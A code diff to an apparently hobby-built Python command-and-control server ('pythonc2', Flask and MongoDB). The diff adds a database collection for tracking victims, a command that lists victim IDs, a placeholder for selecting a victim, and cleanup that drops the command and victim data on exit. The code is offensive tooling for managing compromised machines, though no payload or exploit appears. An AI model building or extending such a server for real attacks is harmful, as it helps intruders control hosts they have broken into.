@@ -5,6 +5,7 @@ import pdb
 import argparse
 from flask import Flask,request
 import pymongo
+import re
 
 
 def generate_stager():
@@ -33,11 +34,18 @@ def init_db(myclient):
         h = {'sample':'To initialize db'}
         mycol.insert_one(h)
 
+    if 'victims' not in collections:
+        mycol = mydb["victims"]
+        h = {'sample':'To initialize db'}
+        mycol.insert_one(h)
+
 def exit_db(myclient):  
     mydb = myclient["pythonc2"]
-    mycol = mydb["commands"]
+    cmds = mydb["commands"]
+    cmds.drop()
+    victims = mydb["victims"]
+    victims.drop()
 
-    mycol.drop()
 
 def insert_cmd_db(myclient,cmd):
     mydb = myclient["pythonc2"]
@@ -45,7 +53,12 @@ def insert_cmd_db(myclient,cmd):
     h = {'command':cmd}
     mycol.insert_one(h)
 
-
+def show_victims(myclient):
+    mydb = myclient['pythonc2']
+    mycol = mydb["victims"]
+    for victim in mycol.find():
+        if 'id' in victim:
+            print(victim['id'])
 def parser():
 	parser = argparse.ArgumentParser(description='Python based C2')
 	
@@ -92,6 +105,12 @@ def main(myclient):
             print("exe dumped to ./tmp")
         if cmd == 'getfiles':
             insert_cmd_db(myclient,cmd)
+        if cmd == 'victims':
+            show_victims(myclient)
+        ## Matching use LKF0599NMU
+        if re.match('use\s\w+',cmd):
+            ## Implement the use victim logic
+            pass
         if cmd == 'exit':
             if 'flask_process' in locals():
                 kill_listeners(flask_process)
